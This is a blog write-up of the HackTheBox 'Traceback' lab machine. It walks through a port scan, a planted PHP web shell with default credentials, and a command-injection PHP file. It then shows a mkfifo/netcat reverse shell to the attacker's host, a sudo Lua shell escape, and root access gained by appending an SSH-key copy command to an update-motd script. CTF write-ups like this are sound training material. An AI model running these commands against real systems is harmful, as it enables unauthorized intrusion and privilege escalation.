<!doctype html><html><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><title>[HackTheBox] Traceback Writeup - yuasa's blog</title><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="I worked on the Traceback retired machine of HackTheBox, so I will write its writeup.
Port Scan kali@kali:~$ nmap -T4 -A -v -Pn -p- 10.10.10.181 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 (RSA) | 256 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d (ECDSA) |_ 256 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) | http-methods: |_ Supported Methods: OPTIONS HEAD GET POST |_http-server-header: Apache/2."><meta property="og:image" content><meta property="og:title" content="[HackTheBox] Traceback Writeup"><meta property="og:description" content="I worked on the Traceback retired machine of HackTheBox, so I will write its writeup.
Port Scan kali@kali:~$ nmap -T4 -A -v -Pn -p- 10.10.10.181 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 (RSA) | 256 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d (ECDSA) |_ 256 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) | http-methods: |_ Supported Methods: OPTIONS HEAD GET POST |_http-server-header: Apache/2."><meta property="og:type" content="article"><meta property="og:url" content="/posts/15/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2022-05-12T11:33:04+09:00"><meta property="article:modified_time" content="2022-05-12T11:33:04+09:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="[HackTheBox] Traceback Writeup"><meta name=twitter:description content="I worked on the Traceback retired machine of HackTheBox, so I will write its writeup.
Port Scan kali@kali:~$ nmap -T4 -A -v -Pn -p- 10.10.10.181 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 (RSA) | 256 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d (ECDSA) |_ 256 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) | http-methods: |_ Supported Methods: OPTIONS HEAD GET POST |_http-server-header: Apache/2."><script src=/js/feather.min.js></script>
<link href=/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css rel=stylesheet><link rel=stylesheet type=text/css media=screen href=/css/main.ac08a4c9714baa859217f92f051deb58df2938ec352b506df655005dcaf98cc0.css><link id=darkModeStyle rel=stylesheet type=text/css href=/css/dark.726cd11ca6eb7c4f7d48eb420354f814e5c1b94281aaf8fd0511c1319f7f78a4.css media="(prefers-color-scheme: dark)"><link rel=icon type=image/png href=/images/favicon.ico></head><body><div class=content><header><div class=main><a href=/>yuasa's blog</a></div><nav><a href=/>Home</a>
<a href=/posts>Posts</a>
<a href=/tags>Tags</a></nav></header><main><article><div class=title><h1 class=title>[HackTheBox] Traceback Writeup</h1><div class=meta>Posted on May 12, 2022</div></div><nav id=TableOfContents><ol><li><a href=#port-scan>Port Scan</a></li><li><a href=#port-80>Port 80</a></li><li><a href=#privilege-escalation-webadmin---sysadmin>Privilege Escalation <code>webadmin</code> -> <code>sysadmin</code></a></li><li><a href=#privilege-escalation-sysadmin---root>Privilege Escalation <code>sysadmin</code> -> <code>root</code></a></li><li><a href=#thoughts>Thoughts</a></li></ol></nav><section class=body><p>I worked on the Traceback retired machine of HackTheBox, so I will write its writeup.</p><p><img src=/images/posts/15/label.png alt=label></p><h1 id=port-scan>Port Scan</h1><pre tabindex=0><code class=language-:bash data-lang=:bash>kali@kali:~$ nmap -T4 -A -v -Pn -p- 10.10.10.181
PORT      STATE    SERVICE        VERSION
22/tcp    open     ssh            OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 (RSA)
|   256 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d (ECDSA)
|_  256 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 (ED25519)
80/tcp    open     http           Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Help us
</code></pre><h1 id=port-80>Port 80</h1><p><a href=http://traceback.htb/>http://traceback.htb/</a></p><p><img src=/images/posts/15/web_index.png alt=index></p><p>If you look at the html source, there are some interesting comments.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-:.html data-lang=:.html><span style=display:flex><span>&lt;<span style=color:#f92672>body</span>&gt;
</span></span><span style=display:flex><span>	&lt;<span style=color:#f92672>center</span>&gt;
</span></span><span style=display:flex><span>		&lt;<span style=color:#f92672>h1</span>&gt;This site has been owned&lt;/<span style=color:#f92672>h1</span>&gt;
</span></span><span style=display:flex><span>		&lt;<span style=color:#f92672>h2</span>&gt;I have left a backdoor for all the net. FREE INTERNETZZZ&lt;/<span style=color:#f92672>h2</span>&gt;
</span></span><span style=display:flex><span>		&lt;<span style=color:#f92672>h3</span>&gt; - Xh4H - &lt;/<span style=color:#f92672>h3</span>&gt;
</span></span><span style=display:flex><span>		<span style=color:#75715e>&lt;!--Some of the best web shells that you might need ;)--&gt;</span>
</span></span><span style=display:flex><span>	&lt;/<span style=color:#f92672>center</span>&gt;
</span></span><span style=display:flex><span>&lt;/<span style=color:#f92672>body</span>&gt;
</span></span><span style=display:flex><span>&lt;/<span style=color:#f92672>html</span>&gt;
</span></span></code></pre></div><p>Searching for <code>Some of the best web shells that you might need</code> will hit the following repositories.
<a href=https://github.com/TheBinitGhimire/Web-Shells>https://github.com/TheBinitGhimire/Web-Shells</a></p><p>If you try the web shell files in order from the top, you can see that <code>smevk.php</code> exists.</p><p><a href=http://traceback.htb/smevk.php>http://traceback.htb/smevk.php</a></p><p><img src=/images/posts/15/web_shell.png alt=shell></p><p>As you can see <a href=https://github.com/TheBinitGhimire/Web-Shells/blob/master/PHP/smevk.php>here</a>, you can log in with User Name: admin, Password: admin.</p><p><img src=/images/posts/15/web_shell_admin.png alt=shell></p><p>Select Code Injector and create <code>cmd.php</code> with the contents of <code>&lt;? php system ($ _GET [" cmd"]);?></code>.</p><p><img src=/images/posts/15/web_shell_code.png alt=shell></p><p>Let&rsquo;s do a reverse shell. First, launch netcat listener</p><pre tabindex=0><code class=language-:bash data-lang=:bash>kali@kali:~$ nc -nlvp 4242
listening on [any] 4242 ...
</code></pre><p>Type the following url encoded into the path parameter in <code>cmd.php</code>.</p><pre tabindex=0><code>rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.2 4242 &gt;/tmp/f
</code></pre><pre tabindex=0><code class=language-:bash data-lang=:bash>$ curl http://traceback.htb/cmd.php?cmd=rm%20%2Df%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20%2Di%202%3E%261%7Cnc%2010%2E10%2E14%2E2%204242%20%3E%2Ftmp%2Ff
</code></pre><p>I got a shell for the <code>webadmin</code> user.</p><pre tabindex=0><code class=language-:bash data-lang=:bash>kali@kali:~$ nc -nlvp 4242
listening on [any] 4242 ...
connect to [10.10.14.2] from (UNKNOWN) [10.10.10.181] 54200
/bin/sh: 0: can&#39;t access tty; job control turned off
$ id
uid=1000(webadmin) gid=1000(webadmin) groups=1000(webadmin),24(cdrom),30(dip),46(plugdev),111(lpadmin),112(sambashare)
</code></pre><h1 id=privilege-escalation-webadmin---sysadmin>Privilege Escalation <code>webadmin</code> -> <code>sysadmin</code></h1><p>And as I proceeded with the investigation, <code>note.txt</code> contains what seems to be a clue.</p><pre tabindex=0><code class=language-:bash data-lang=:bash>$ ls -la /home/webadmin
total 44
drwxr-x--- 5 webadmin sysadmin 4096 Apr 22  2021 .
drwxr-xr-x 4 root     root     4096 Aug 25  2019 ..
-rw------- 1 webadmin webadmin  105 Mar 16  2020 .bash_history
-rw-r--r-- 1 webadmin webadmin  220 Aug 23  2019 .bash_logout
-rw-r--r-- 1 webadmin webadmin 3771 Aug 23  2019 .bashrc
drwx------ 2 webadmin webadmin 4096 Aug 23  2019 .cache
drwxrwxr-x 3 webadmin webadmin 4096 Apr 22  2021 .local
-rw-rw-r-- 1 webadmin webadmin    1 Aug 25  2019 .luvit_history
-rw-r--r-- 1 webadmin webadmin  807 Aug 23  2019 .profile
drwxrwxr-x 2 webadmin webadmin 4096 Feb 27  2020 .ssh
-rw-rw-r-- 1 sysadmin sysadmin  122 Mar 16  2020 note.txt

$ cat /home/webadmin/note.txt
- sysadmin -
I have left a tool to practice Lua.
I&#39;m sure you know where to find it.
Contact me if you have any question.
</code></pre><p>You can also see that running <code>sudo -l</code> can run <code>/home/sysadmin/luvit</code> with sysadmin privileges without a password. And luvit is probably <code>a tool to practice Lua</code> suggested in <code>note.txt</code>.</p><p>You can get the sysadmin user&rsquo;s shell by privilege escalation with reference to <a href=https://gtfobins.github.io/gtfobins/lua/>GTFObins</a>.</p><pre tabindex=0><code class=language-:bash data-lang=:bash>$ cd /home/webadmin
$ echo &#39;os.execute(&#34;/bin/sh&#34;)&#39; &gt; privesc.lua 
$ sudo -u sysadmin /home/sysadmin/luvit privesc.lua 
sh: turning off NDELAY mode

python3 -c &#39;import pty; pty.spawn(&#34;/bin/sh&#34;)&#39;
$ id
uid=1001(sysadmin) gid=1001(sysadmin) groups=1001(sysadmin)
$ cat /home/sysadmin/user.txt
*************************
</code></pre><h1 id=privilege-escalation-sysadmin---root>Privilege Escalation <code>sysadmin</code> -> <code>root</code></h1><p>If you look at the process running with root privileges, you can see that <code>/var/backups/.update-motd.d/*</code> is copied to <code>/etc/update-motd.d/</code> every 30 seconds. And <code>/etc/update-motd.d/</code> is writable by the sysadmin user.</p><pre tabindex=0><code class=language-:bash data-lang=:bash>$ ps -ef | grep root
...
root      83317  83315  0 08:56 ?        00:00:00 /bin/sh -c sleep 30 ; /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/
...

$ ls -la /etc/update-motd.d/
ls -la /etc/update-motd.d/
total 32
drwxr-xr-x  2 root sysadmin 4096 Apr 22  2021 .
drwxr-xr-x 80 root root     4096 Apr 22  2021 ..
-rwxrwxr-x  1 root sysadmin  981 May 11 09:22 00-header
-rwxrwxr-x  1 root sysadmin  982 May 11 09:22 10-help-text
-rwxrwxr-x  1 root sysadmin 4264 May 11 09:22 50-motd-news
-rwxrwxr-x  1 root sysadmin  604 May 11 09:22 80-esm
-rwxrwxr-x  1 root sysadmin  299 May 11 09:22 91-release-upgrade
</code></pre><p>If you check <a href=https://wiki.ubuntu.com/UpdateMotd>this</a>, you can see that it is the place to store the script executed at login.</p><p>First, the webadmin user can write to <code>/home/webadmin/.ssh</code>, so add the public key to authorized_keys. Copy the private key <code>id_rsa</code> to the kali side and delete it from the target machine.</p><pre tabindex=0><code class=language-:bash data-lang=:bash>$ ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/webadmin/.ssh/id_rsa): 
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/webadmin/.ssh/id_rsa.
Your public key has been saved in /home/webadmin/.ssh/id_rsa.pub.
The key fingerprint is:
SHA256:1+kxpOD21CsaFwj0/ExxArl0mXZf5AKNeH0tc4iCNdA webadmin@traceback
The key&#39;s randomart image is:
+---[RSA 2048]----+
|      . oB=+o= oo|
|     . o+ E==.*.=|
|      ..++.+...*.|
|       o.* = ... |
|        S B *    |
|       . + o +   |
|        . + o    |
|         + .     |
|        .        |
+----[SHA256]-----+
$ ls -la /home/webadmin/.ssh
total 16
drwxrwxr-x 2 webadmin webadmin 4096 May 11 09:39 .
drwxr-x--- 5 webadmin sysadmin 4096 May 11 06:32 ..
-rw------- 1 webadmin webadmin    0 Feb 27  2020 authorized_keys
-rw------- 1 webadmin webadmin 1675 May 11 09:39 id_rsa
-rw-r--r-- 1 webadmin webadmin  400 May 11 09:39 id_rsa.pub
$ cp /home/webadmin/.ssh/id_rsa.pub /home/webadmin/.ssh/authorized_keys
$ rm /home/webadmin/.ssh/id_rsa
</code></pre><p>Go back to the sysadmin shell and do the following. This is a script that copies the <code>webadmin</code> public key to the <code>root</code> public key at login.</p><pre tabindex=0><code class=language-:bash data-lang=:bash>$ echo &#34;cp /home/webadmin/.ssh/authorized_keys /root/.ssh/&#34; &gt;&gt; /etc/update-motd.d/00-header
</code></pre><p>SSH connection with <code>webadmin</code> during 30 seconds when cleanup is done.</p><pre tabindex=0><code class=language-:bash data-lang=:bash>kali@kali:~$ ssh -i id_rsa webadmin@traceback.htb
</code></pre><p>Once the SSH connection is complete, you will be able to log in as root.</p><pre tabindex=0><code class=language-:bash data-lang=:bash>kali@kali:~$ ssh -i id_rsa root@traceback.htb
#################
-------- OWNED BY XH4H  ---------
- I guess stuff could have been configured better ^^ -
#################

Welcome to Xh4H land 



Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Mon Apr 26 02:23:35 2021
root@traceback:~# id
uid=0(root) gid=0(root) groups=0(root)
root@traceback:~# cat /root/root.txt
*************************
</code></pre><h1 id=thoughts>Thoughts</h1><p>I didn&rsquo;t know about UpdateMotd, so it was nice to learn about privilege escalation using it.</p></section><div class=post-tags><nav class="nav tags"><ul class=tags><li><a href=/tags/hackthebox>hackthebox</a></li><li><a href=/tags/writeup>writeup</a></li></ul></nav></div></article></main><footer><div style=display:flex><a class=soc href=https://github.com/melonattacker title=GitHub><i data-feather=github></i></a>
<a class=border></a><a class=soc href=https://x.com/melonattacker title=X><i data-feather=x></i></a>
<a class=border></a></div><div class=footer-info>2025 Â© yuasa | <a href=https://github.com/athul/archie>Archie Theme</a> | Built with <a href=https://gohugo.io>Hugo</a></div></footer><script>feather.replace()</script></div></body></html>